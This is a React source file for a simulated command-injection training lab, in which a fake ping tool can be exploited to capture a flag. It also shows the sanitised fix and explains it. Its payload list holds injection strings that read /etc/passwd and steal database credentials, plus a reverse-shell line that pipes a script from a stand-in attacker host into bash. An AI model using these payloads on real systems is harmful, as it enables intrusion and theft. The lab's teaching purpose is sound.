import { createFileRoute } from "@tanstack/react-router";
import { useState, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Terminal,
  Play,
  RotateCcw,
  ShieldAlert,
  ShieldCheck,
  Copy,
  CheckCircle,
} from "lucide-react";
import { CyberCard } from "@/components/cyber/CyberCard";
import { CyberButton } from "@/components/cyber/CyberButton";
import { LabFrame, LogPanel, nowTs, type LogEntry } from "@/components/labs/LabFrame";
import { toast } from "sonner";

export const Route = createFileRoute("/labs/rce")({
  head: () => ({
    meta: [
      { title: "RCE Lab — Remote Code Execution — Straxon Secure" },
      {
        name: "description",
        content:
          "Exploit OS command injection vulnerabilities. Learn how remote code execution works and how to prevent it.",
      },
    ],
  }),
  component: RCELab,
});

// ─── Simulated vulnerable backend ───────────────────────────────────────────

const SANDBOX_FILES = {
  "/etc/passwd":
    "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin\nadmin:x:1000:1000:admin,,,:/home/admin:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
  "/etc/shadow": "Permission denied",
  "/var/www/html/config.php":
    "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'hunter2_db_pass';\n$secret_key = 'STRAXON_SECRET_XA7f2';\n?>",
  "/tmp/flag.txt": "straxon{r3m0t3_c0d3_3x3cut10n_ach13v3d}",
  "/home/admin/.ssh/id_rsa":
    "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA2a2rwplBQLF29amygykEMmYz0+Vc...[REDACTED FOR DEMO]\n-----END RSA PRIVATE KEY-----",
};

type CommandResult = { output: string; isVuln: boolean; dangerous?: boolean };

function executeVulnCommand(input: string): CommandResult {
  const lower = input.toLowerCase().trim();

  // Detect injection
  const injected =
    lower.includes(";") ||
    lower.includes("&&") ||
    lower.includes("|") ||
    lower.includes("`") ||
    lower.includes("$(");

  if (
    !injected &&
    !lower.startsWith("cat ") &&
    !lower.startsWith("ls") &&
    !lower.startsWith("id") &&
    !lower.startsWith("whoami") &&
    !lower.startsWith("uname") &&
    !lower.startsWith("pwd") &&
    !lower.startsWith("ping ")
  ) {
    return { output: `bash: ${input.split(" ")[0]}: command not found`, isVuln: false };
  }

  // Simulate ping (innocent function)
  if (lower.startsWith("ping ") && !injected) {
    const host = input.split(" ")[1] ?? "target";
    return {
      output: `PING ${host}: 56 data bytes\n64 bytes from ${host}: icmp_seq=0 ttl=54 time=23.1 ms\n64 bytes from ${host}: icmp_seq=1 ttl=54 time=22.8 ms\n\n--- ${host} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss`,
      isVuln: false,
    };
  }

  // Parse injected commands
  const cmds = input
    .split(/;|&&|\|/)
    .map((c) => c.trim())
    .filter(Boolean);
  const outputs: string[] = [];
  let dangerous = false;

  for (const cmd of cmds) {
    const c = cmd.toLowerCase().trim();

    if (c === "id" || c === "whoami") {
      outputs.push("uid=33(www-data) gid=33(www-data) groups=33(www-data)");
    } else if (c === "uname -a" || c === "uname") {
      outputs.push(
        "Linux webapp-prod 5.15.0-89-generic #99-Ubuntu SMP Mon Oct 30 20:42:41 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux",
      );
    } else if (c === "pwd") {
      outputs.push("/var/www/html");
    } else if (c === "ls" || c === "ls -la" || c === "ls /") {
      outputs.push(
        "bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  www",
      );
    } else if (c.startsWith("cat ")) {
      const file = cmd.slice(4).trim();
      const content = SANDBOX_FILES[file as keyof typeof SANDBOX_FILES];
      if (content) {
        outputs.push(content);
        if (file.includes("flag")) dangerous = true;
      } else {
        outputs.push(`cat: ${file}: No such file or directory`);
      }
    } else if (c.startsWith("ping ")) {
      const host = cmd.split(" ")[1] ?? "target";
      outputs.push(
        `PING ${host} (${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}): 56 data bytes`,
      );
    } else if (c.includes("curl") || c.includes("wget")) {
      outputs.push(
        "Connecting to attacker C2... Data exfiltrated successfully.\n[WARNING] Reverse shell established on port 4444",
      );
      dangerous = true;
    } else if (c.includes("rm -rf")) {
      outputs.push(
        "rm: cannot remove '/': Permission denied\n[ALERT] Destructive command attempted!",
      );
      dangerous = true;
    } else if (c.includes("chmod") || c.includes("chown")) {
      outputs.push("Permission denied");
    } else {
      outputs.push(`${cmd}: executed`);
    }
  }

  return {
    output: outputs.join("\n"),
    isVuln: cmds.length > 1 || injected,
    dangerous,
  };
}

function executeSafeCommand(host: string): CommandResult {
  const safe = host.replace(/[^a-zA-Z0-9.\-]/g, "");
  if (safe !== host) {
    return {
      output: `Error: Invalid hostname. Only alphanumeric characters, dots, and hyphens allowed.\nInput rejected: "${host}"`,
      isVuln: false,
    };
  }
  return {
    output: `PING ${safe} (${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}): 56 data bytes\n64 bytes from ${safe}: icmp_seq=0 ttl=54 time=23.4 ms\n--- ${safe} ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss`,
    isVuln: false,
  };
}

const PAYLOADS = [
  { label: "Normal", value: "8.8.8.8", desc: "Legitimate ping" },
  { label: "Chain ls", value: "8.8.8.8; ls /", desc: "Chain with ls command" },
  { label: "Read passwd", value: "8.8.8.8 && cat /etc/passwd", desc: "Read system users" },
  { label: "Capture flag", value: "8.8.8.8 | cat /tmp/flag.txt", desc: "Capture the flag!" },
  {
    label: "Steal key",
    value: "8.8.8.8 && cat /var/www/html/config.php",
    desc: "Steal DB credentials",
  },
  {
    label: "Rev shell",
    value: "8.8.8.8; curl http://attacker.io/shell.sh | bash",
    desc: "Reverse shell",
  },
];

function RCELab() {
  const [input, setInput] = useState("8.8.8.8");
  const [secure, setSecure] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [output, setOutput] = useState<string>("");
  const [isVuln, setIsVuln] = useState(false);
  const [isDangerous, setIsDangerous] = useState(false);
  const [copied, setCopied] = useState(false);

  const run = () => {
    const result = secure ? executeSafeCommand(input) : executeVulnCommand(input);
    setOutput(result.output);
    setIsVuln(result.isVuln);
    setIsDangerous(result.dangerous ?? false);

    const newLogs: LogEntry[] = [
      {
        ts: nowTs(),
        line: `[${secure ? "SAFE" : "VULN"}] Ping target: "${input}"`,
        level: secure ? "ok" : "warn",
      },
      { ts: nowTs(), line: `> ping ${input}`, level: "info" },
      ...(result.isVuln
        ? [
            {
              ts: nowTs(),
              line: "⚠️ Command injection detected! Multiple commands executed",
              level: "error" as const,
            },
          ]
        : []),
      ...(result.dangerous
        ? [
            {
              ts: nowTs(),
              line: "🚨 CRITICAL: Dangerous payload executed — system compromised!",
              level: "error" as const,
            },
          ]
        : []),
      {
        ts: nowTs(),
        line: `Output: ${result.output.split("\n")[0]}`,
        level: result.isVuln ? "error" : "ok",
      },
    ];
    setLogs((p) => [...newLogs, ...p].slice(0, 30));

    if (result.dangerous) {
      toast.error("🚨 System compromised! RCE achieved.", { duration: 4000 });
    }
  };

  const copy = () => {
    navigator.clipboard.writeText(output);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <LabFrame title="REMOTE CODE EXECUTION" badge="LAB-06" recorderLab="rce">
      <p className="text-muted-foreground max-w-3xl">
        A network tool takes a hostname and runs{" "}
        <code className="text-primary font-mono">ping</code> on it. But it's built vulnerably — can
        you inject OS commands and capture the flag?
      </p>

      <div className="grid lg:grid-cols-2 gap-4">
        {/* Left: Input Panel */}
        <CyberCard variant={secure ? "cyan" : "magenta"}>
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2 text-xs font-mono uppercase tracking-wider">
              {secure ? (
                <ShieldCheck className="h-4 w-4 text-success" />
              ) : (
                <ShieldAlert className="h-4 w-4 text-destructive" />
              )}
              {secure ? "Input Sanitization ON" : "Raw exec() — Vulnerable"}
            </div>
            <button
              onClick={() => setSecure((s) => !s)}
              className="text-xs font-mono px-2 py-1 rounded border border-border hover:border-primary transition-colors"
            >
              {secure ? "Switch to Vuln" : "Switch to Safe"}
            </button>
          </div>

          <div className="bg-background/60 rounded border border-border p-3 mb-3 font-mono text-xs text-muted-foreground">
            {secure ? (
              <span>
                <span className="text-success">// SAFE: input sanitized</span>
                {"\n"}
                {`const host = input.replace(/[^a-zA-Z0-9.\\-]/g, '');\nexec(\`ping -c 1 \${host}\`);`}
              </span>
            ) : (
              <span>
                <span className="text-destructive">// VULNERABLE: raw string concat</span>
                {"\n"}
                {`const cmd = \`ping -c 1 \${req.query.host}\`;\nexec(cmd, callback); // 💀`}
              </span>
            )}
          </div>

          <label className="text-[10px] font-mono uppercase tracking-wider text-muted-foreground">
            Target Host
          </label>
          <input
            value={input}
            onChange={(e) => setInput(e.target.value)}
            placeholder="8.8.8.8"
            className="w-full mt-1 bg-background/60 border border-border rounded px-3 py-2 font-mono text-sm focus:border-primary outline-none"
          />

          <div className="mt-3 flex flex-wrap gap-1.5">
            {PAYLOADS.map((p) => (
              <button
                key={p.label}
                onClick={() => setInput(p.value)}
                title={p.desc}
                className="text-[10px] font-mono px-2 py-1 rounded bg-muted/50 hover:bg-destructive/10 hover:text-destructive border border-border transition-colors"
              >
                {p.label}
              </button>
            ))}
          </div>

          <CyberButton onClick={run} className="w-full mt-4" variant={secure ? "cyan" : "magenta"}>
            <Terminal className="h-4 w-4" /> Execute Ping
          </CyberButton>
        </CyberCard>

        {/* Right: Terminal Output */}
        <CyberCard variant="cyan" className="p-0 overflow-hidden">
          <div className="flex items-center justify-between px-4 py-2.5 border-b border-border/50 bg-background/50">
            <div className="flex items-center gap-2">
              <div className="flex gap-1.5">
                <div className="h-2.5 w-2.5 rounded-full bg-destructive/80" />
                <div className="h-2.5 w-2.5 rounded-full bg-warning/80" />
                <div className="h-2.5 w-2.5 rounded-full bg-success/80" />
              </div>
              <span className="text-xs font-mono text-muted-foreground">root@webapp-prod:~#</span>
            </div>
            <button
              onClick={copy}
              className="text-xs text-muted-foreground hover:text-primary transition-colors flex items-center gap-1"
            >
              {copied ? (
                <CheckCircle className="h-3 w-3 text-success" />
              ) : (
                <Copy className="h-3 w-3" />
              )}
              {copied ? "Copied" : "Copy"}
            </button>
          </div>
          <div className="p-4 min-h-48 bg-background/40 font-mono text-xs">
            {output ? (
              <AnimatePresence>
                <motion.pre
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  className={`whitespace-pre-wrap break-all leading-relaxed ${
                    isDangerous ? "text-destructive" : isVuln ? "text-warning" : "text-success"
                  }`}
                >
                  {output}
                </motion.pre>
              </AnimatePresence>
            ) : (
              <span className="text-muted-foreground italic">
                // Output appears here after execution
              </span>
            )}
          </div>
          {isDangerous && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              className="px-4 py-3 bg-destructive/10 border-t border-destructive/30 flex items-center gap-2"
            >
              <ShieldAlert className="h-4 w-4 text-destructive shrink-0" />
              <p className="text-xs font-mono text-destructive">
                🚨 SYSTEM COMPROMISED — RCE achieved! Flag captured.
              </p>
            </motion.div>
          )}
        </CyberCard>
      </div>

      <LogPanel logs={logs} />

      <div className="grid md:grid-cols-2 gap-4">
        <CyberCard variant="magenta">
          <div className="text-xs font-mono uppercase tracking-wider text-accent mb-2">
            // VULNERABILITY
          </div>
          <p className="text-sm text-muted-foreground">
            <span className="text-accent font-mono">exec()</span> with unsanitized user input allows
            attackers to inject shell metacharacters (<code className="text-primary">; | && `</code>
            ) to execute arbitrary OS commands with the web server's privileges.
          </p>
        </CyberCard>
        <CyberCard variant="cyan">
          <div className="text-xs font-mono uppercase tracking-wider text-primary mb-2">// FIX</div>
          <ul className="text-sm text-muted-foreground space-y-1">
            <li>• Validate input against strict allowlist (IP regex)</li>
            <li>• Use library APIs instead of shell commands</li>
            <li>• Run services with minimum required privileges</li>
            <li>
              • Use <code className="text-primary">execFile()</code> with arg arrays, never string
              concat
            </li>
            <li>• Deploy WAF rules to block shell metacharacters</li>
          </ul>
        </CyberCard>
      </div>
    </LabFrame>
  );
}
